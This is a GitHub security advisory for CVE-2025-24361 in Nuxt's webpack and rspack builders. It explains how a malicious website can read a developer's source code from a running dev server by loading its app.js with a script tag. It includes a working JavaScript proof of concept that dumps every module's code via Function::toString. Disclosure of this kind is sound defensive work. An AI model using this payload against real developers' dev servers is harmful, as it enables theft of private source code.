# [M] Opening a malicious website while running a Nuxt dev server could allow read-only access to code

## Summary
Severity: Medium
Advisory: GHSA-4gf7-ff8x-hq99
CVE: CVE-2025-24361
CWE: CWE-749
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2025-01-27
Source: https://github.com/advisories/GHSA-4gf7-ff8x-hq99
Type: github-advisory

## Affected
- npm: `@nuxt/webpack-builder` — affected >=3.0.0 <3.15.3
- npm: `@nuxt/rspack-builder` — affected >=3.12.2 <3.15.3

## Details
### Summary
Source code may be stolen during dev when using webpack / rspack builder and you open a malicious web site.

### Details
Because the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src="http://localhost:3000/_nuxt/app.js">` in their site and run the script.
By using `Function::toString` against the values in `window.webpackChunknuxt_app`, the attacker can get the source code.

### PoC
1. Create a nuxt project with webpack / rspack builder.
1. Run `npm run dev`
1. Open `http://localhost:3000`
1. Run the script below in a web site that has a different origin.
1. You can see the source code output in the document and the devtools console.

```js
const script = document.createElement('script')
script.src = 'http://localhost:3000/_nuxt/app.js'
script.addEventListener('load', () => {
  for (const page in window.webpackChunknuxt_app) {
    const moduleList = window.webpackChunknuxt_app[page][1]
    console.log(moduleList)

    for (const key in moduleList) {
      const p = document.createElement('p')
      const title = document.createElement('strong')
      title.textContent = key
      const code = document.createElement('code')
      code.textContent = moduleList[key].toString()
      p.append(title, ':', document.createElement('br'), code)
      document.body.appendChild(p)
    }
  }
})
document.head.appendChild(script)
```

![image](https://github.com/user-attachments/assets/201e39b7-da5c-4359-867f-96c9adfd3c85)
It contains the compiled source code and also the source map (but it seems the sourcemap contains transformed content in the `sourcesContent` field).

### Impact
Users using webpack / rspack builder may get the source code stolen by malicious websites.

## References
- https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99
- https://nvd.nist.gov/vuln/detail/CVE-2025-24361
- https://github.com/nuxt/nuxt/commit/7eeb910bf4accb1e0193b9178c746f06ad3dd88f
- https://github.com/nuxt/nuxt
